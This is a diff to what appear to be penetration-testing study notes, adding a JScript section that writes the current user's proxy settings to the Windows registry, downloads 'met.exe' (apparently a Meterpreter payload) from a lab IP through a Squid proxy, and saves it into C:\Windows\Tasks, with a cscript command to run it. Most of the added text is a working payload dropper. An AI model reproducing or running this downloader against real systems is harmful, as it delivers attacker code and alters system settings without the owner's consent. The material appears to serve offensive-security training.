@@ -133,6 +133,61 @@ Server username: COMMANDO\dooley
 - https://learn.microsoft.com/en-us/sql/ado/guide/data/command-streams?view=sql-server-ver16
 - ADO stands for ActiveX Data Objects.  The ADO Stream Object is used to read, write, and manage a stream of binary or text data.
 
+### JScript and Proxies
+
+- download file
+```js
+var proxyServer = "http://192.168.250.12:3128"; // Your Squid proxy server
+var url = "http://192.168.45.219/met.exe"; // URL to download the file from
+var destination = "C:\\Windows\\Tasks\\met.exe"; // Destination path to save the file
+
+// Set system proxy settings for the script
+function setSystemProxy(proxyServer) {
+    try {
+        var WshShell = new ActiveXObject("WScript.Shell");
+        WshShell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyEnable", 1, "REG_DWORD");
+        WshShell.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer", proxyServer, "REG_SZ");
+    } catch (e) {
+        WScript.Echo("Failed to set proxy settings: " + e.message);
+    }
+}
+
+// Function to download a file using XMLHttpRequest
+function downloadFile(url, destination) {
+    try {
+        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+        xhr.open("GET", url, false);
+        xhr.send();
+
+        if (xhr.status === 200) {
+            var stream = new ActiveXObject("ADODB.Stream");
+            stream.Open();
+            stream.Type = 1; // adTypeBinary
+            stream.Write(xhr.responseBody);
+            stream.Position = 0;
+
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            if (fso.FileExists(destination)) {
+                fso.DeleteFile(destination);
+            }
+
+            stream.SaveToFile(destination, 2); // adSaveCreateOverWrite
+            stream.Close();
+            WScript.Echo("File downloaded successfully to " + destination);
+        } else {
+            WScript.Echo("Failed to download file. HTTP status: " + xhr.status);
+        }
+    } catch (e) {
+        WScript.Echo("Error: " + e.message);
+    }
+}
+
+// Set the system proxy and download the file
+setSystemProxy(proxyServer);
+downloadFile(url, destination);
+
+```
+- to run from shell `cscript .\file.js`
 
 
 ## JScript and C\#
